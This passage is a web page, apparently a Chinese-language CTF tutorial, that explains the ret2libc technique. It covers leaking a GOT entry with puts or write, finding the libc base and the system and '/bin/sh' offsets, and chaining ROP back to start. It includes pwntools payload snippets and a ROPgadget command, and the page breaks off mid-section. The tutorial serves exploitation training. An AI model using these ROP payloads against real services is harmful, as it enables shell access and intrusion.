@@ -1,0 +1,780 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>【PWN技】ret2libc</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="e4ce3fc1-2daf-428a-8819-733ea0132b35" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_henri_rousseau_1907.jpg" style="object-position:center 30.000000000000004%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">✈️</span></div><h1 class="page-title">【PWN技】ret2libc</h1><p class="page-description"></p></header><div class="page-body"><blockquote id="46988a63-019a-4bda-bb22-363efd9a04a9" class="">满堂花醉三千客，一剑霜寒十九州</blockquote><h1 id="0a75dd1f-657b-4b39-bc30-54dcadf1bae5" class="">一、相关基础</h1><h3 id="68552ed2-fdab-4c36-a9d0-5f704aae4b00" class="">1-ret2libc原理</h3><p id="127e8f1b-d4ab-4045-a333-b8ab1039abcb" class="">可执行文件中的资源不一定能够达成execve(”/bin/sh”)或获得某重要gadget，所以我们要去libc中获得</p><p id="1a1ad59d-6c79-4f13-bb58-007012479be1" class="">但是libc默认会应用pie+ASLR机制，也就是基址会变，所以我们需要先劫持read去泄漏libc中一个<code>任意函数@got</code>处的值（也就是该libc函数符号解析后得到的地址），结合该函数在这个libc中的偏移，从而得到libc基址。</p><p id="437ac08c-1a07-4edc-b877-5946e9d9b8d7" class="">然后根据libc基址，加上我们要用到的libc里面的某些东西的偏移，就可以得到我们要用到的libc里的这些东西的地址。</p><h3 id="ac092198-592b-4ff4-8b67-4fc252933cb5" class="">2-利用过程</h3><p id="462db771-3ab3-4f01-affd-fc51e25a238f" class="">所以整个利用过程如下：<div class="indented"><p id="7fb93da1-1449-4c70-97b0-df4ea8a6ecc4" class="">1、用一条ROP链实现：劫持write（或者是puts）去泄漏libc中一个<code>任意函数@got</code>处的值</p><p id="d515922d-695f-46c9-9898-0efa151e3e1f" class="">2、获得libc版本，然后根据libc版本获得：<div class="indented"><p id="9fa7a83a-75a7-4992-a87e-91ad08157807" class="">（1）被泄露的这个函数在这个libc中的偏移</p><p id="a15bd889-f137-45fb-b347-a442b3049624" class="">（2）后需要用到的libc里的东西在这个libc中的偏移</p></div></p><p id="7c7ed36b-5bc5-4229-8bc7-8e6ac68fdd3a" class="">3、计算被泄露函数的“地址-偏移”，得到libc基址，然后计算后需要用到的libc里的东西的“libc基址+偏移”得到这些东西的地址</p><p id="2a6fcf44-f0ec-4642-b06c-6fa493ac6724" class="">4、再开一条ROP链实现：execve(”/bin/sh”)</p></div></p><h3 id="9f3f2b75-e726-4d18-88f6-af9b811e8c3d" class="">3-用什么函数进行泄漏</h3><p id="0043ac3c-d8f9-4bb5-b686-56a3e1a7d1e2" class="">一般就是有什么函数就用什么函数，推荐用read进行泄漏：</p><ul id="4b3d464a-e317-466e-a484-2ae0ed1029be" class="bulleted-list"><li style="list-style-type:disc">write函数：固定写出n个字节不会被’\0’导致截断，好用，爱用！</li></ul><ul id="b6d56dfb-f46b-4b5a-aef7-2ec6753584a7" class="bulleted-list"><li style="list-style-type:disc">puts函数：缺点是遇到’\0’会导致截断</li></ul><ul id="e9283953-66f4-4d0d-8233-e0e8e7b342f7" class="bulleted-list"><li style="list-style-type:disc">printf函数：缺点是遇到’\0’会导致截断</li></ul><h3 id="b140fd0c-bcfe-4699-a2f1-5bc57c6977ca" class="">4-泄漏哪些函数</h3><p id="1b7c6ef8-b6dd-4799-bc66-2e40d9c10433" class="">不建议泄漏stelen、memset这些函数，因为他们不在glibc里</p><h1 id="3022f1ef-d74d-4264-a4b5-bb5bf212c37b" class="">二、步骤详解</h1><h3 id="690e5bc6-231d-4dfe-84a8-7158e0ffe372" class="">1-如何劫持write（或puts）实现泄漏<code>某函数@got</code>的值</h3><blockquote id="1ff234b5-c3fc-4d8f-94e2-c7a8ce3487b1" class="">注意-关于被泄露函数的选择：<p id="60a61a8b-7b2a-4eb8-9b8c-6563bf9c8fee" class="">由于延迟绑定机制，只有执行过的函数其got表表项的值才是被填充的，所以只能去泄漏执行过的函数地址。这里建议无脑泄漏libc_start_main函数。</p><p id="9dd376e9-ac4a-4dc6-abc6-ac8f0f17fd2d" class="">只有在full relro中，因为延迟绑定被禁止，所以整张got表在程序初始运行时就全部符号解析完毕，就可以随便泄漏任意一个函数。</p></blockquote><ul id="871326df-3391-4257-b9a5-3da4519290f8" class="toggle"><li><details open=""><summary><strong>x32下思路+示例</strong></summary><p id="9bd145c8-5401-4a0d-955c-037e5d3c30ad" class=""><strong>【思路】</strong></p><p id="51422c0e-b8b5-486d-b14b-d8c854ef41ae" class="">传统方式是使用“plt式劫持法”+“通过ret2start的方式实现多条rop链”，构建如下rop链：<div class="indented"><p id="07294fbd-c5dd-484e-8a35-d1304edf5f8c" class="">“执行write函数→start函数”，或者构建“执行puts函数→start函数”</p><blockquote id="7615d19e-829b-41ce-8655-434ecf14526a" class="">这里因为ret2start它是“入函数劫持法”，而这个start函数是没有传参的，所以就不需要pop|ret这样的“抬栈gadget”了</blockquote></div></p><p id="1cbea15c-14d0-4ce4-a003-ea376029ae70" class="">在一些特殊的情况下，比如有些程序<mark class="highlight-teal">编译后没有start函数</mark>，就可以把“通过ret2start的方式实现多条rop链”改成“通过ret2read的方式实现多条rop链”，构建如下rop链：<div class="indented"><p id="19f765e7-45cb-47b4-af89-096567fc9d33" class="">“执行write函数→pop3ret→read函数”，或者构建“执行puts函数→pop1ret→read函数”</p></div></p><p id="6873b1fa-cf77-4858-87fe-03768eb7d130" class=""><strong>【示例】</strong></p><p id="b06ce689-ec45-4e51-8b1f-82d7a1fb414e" class="">例子中：<div class="indented"><p id="a1498cd1-54b9-4d14-80cf-82371b935f45" class="">1、构建“执行puts函数→start函数”的rop链</p><p id="4114926d-93b6-462f-ad3a-853cba8e93ad" class="">2、泄露libc_start_main的地址</p><p id="a957f0c5-d639-46df-b2e1-c60c006ef80d" class="">3、通过ret2start的方式实现多条rop链</p></div></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5fa45207-1218-4239-ba2b-36557cfba017" class="code"><code class="language-Python">start_addr =...
+puts_plt =...
+libc_start_main_got =...
+
+#劫持泄露
+p.recvuntil(&#x27;某段提示字符&#x27;)
+payload=b&#x27;q&#x27;*偏移 + p32(puts_plt_addr) +  p32(start_addr) + p32(libc_start_main_got_addr)
+p.sendline(payload)
+
+#获得被泄露函数的地址
+libc_start_main_addr = u32(p.recv(4))
+print(&quot;__libc_start_main_addr: &quot;,hex(libc_start_main_addr))</code></pre></details></li></ul><ul id="bc03ef0a-cbeb-492d-87cc-ecc035329462" class="toggle"><li><details open=""><summary><strong>x64下思路+示例</strong></summary><p id="7bf9e44f-ff21-447e-ad65-a629122b8bda" class=""><strong>【思路】</strong></p><p id="bebcf2d5-fcf8-45e7-99b4-9e8203410e9d" class="">传统方式是使用“init式劫持法”+“通过ret2start的方式实现多条rop链”，构建如下rop链：<div class="indented"><p id="de6ff092-eca5-4de5-9497-bf2740dfa44e" class="">“执行write函数→start函数”，或者构建“执行puts函数→start函数”</p></div></p><p id="67da63c4-0e5a-4511-aef1-86a8b1c538bb" class="">程序<mark class="highlight-teal">编译后没有start函数时</mark>，也是可以改成“通过ret2read的方式实现多条rop链”</p><p id="a51397bb-9dba-4a2c-a8e0-79f20b243e92" class=""><strong>【示例】</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c31f582f-1fec-4799-8ec8-4b686a797cf9" class="code"><code class="language-Python"></code></pre></details></li></ul><h3 id="d57e0d83-896d-4ab2-90d0-e08b9c97b60d" class="">2-如何获得libc版本+要用到的偏移</h3><ul id="0564e022-c4de-41c9-8f8d-9a5d890f914a" class="bulleted-list"><li style="list-style-type:disc"><strong>如果题目附件给了libc文件：</strong><ul id="7c50db14-e070-4f5d-b57d-fa8c95b36b14" class="toggle"><li><details open=""><summary>查看system和binsh偏移的代码如下</summary><p id="0228e9e1-a26c-4137-a9c6-35e91aaf44b1" class="">使用pwntools：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0317c4e5-bbdb-4aac-a61e-fbac39a57455" class="code"><code class="language-Python">from pwn import *
+context.log_level = &#x27;debug&#x27;
+libc = ELF(&#x27;./libc-2.27.so&#x27;)
+
+# 获得所有要用到的偏移
+printf_offset=libc.symbols[&#x27;printf&#x27;]#这里假设前面ROP链泄露的是print函数地址
+puts_offset=libc.symbols[&#x27;puts&#x27;]
+system_offset=libc.symbols[&#x27;system&#x27;]
+binsh_offset=next(libc.search(b&#x27;/bin/sh&#x27;))
+
+# 输出
+print(&quot;泄露printf_offset:&quot;,hex(puts_offset))
+print(&quot;puts_offset:&quot;,hex(puts_offset))
+print(&quot;system_offset&quot;,hex(system_offset))
+print(&quot;binsh_offset&quot;,hex(binsh_offset))</code></pre><p id="abb15c50-52f0-4dc3-9fa5-853f238c3e18" class="">如果pwntools无法得到“/bin/sh”，则使用ROPgadget工具查找这个libc文件以获得“/bin/sh”：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ffb7c5b6-7943-43d9-aef7-160f24b0930e" class="code"><code class="language-Python">ROPgadget --binary libc.so.6 --string &#x27;/bin/sh&#x27;</code></pre></details></li></ul></li></ul><ul id="cd1ab33a-0298-4529-a494-2a5f8b6d2df5" class="bulleted-list"><li style="list-style-type:disc"><strong>如果题目附件没有给libc文件：</strong><p id="38163b84-1a47-4fd1-a31e-7b5d7e0ec717" class="">我们就需要手动想办法获得题目程序的libc版本，这里有以下两种思路：</p><ul id="8a9c4259-b016-443a-826e-417bfeae9315" class="toggle"><li><details open=""><summary>思路1-根据泄漏函数地址的低3位来查看libc版本（好用，BROP下也可以用）</summary><p id="650e1f0e-852b-4535-9db3-ecce3a8e0a41" class="">【原理】</p><p id="e252588e-9d13-4e06-810b-60b519fe7ad5" class="">aslr的基址随机化不会改变地址的低3位</p><p 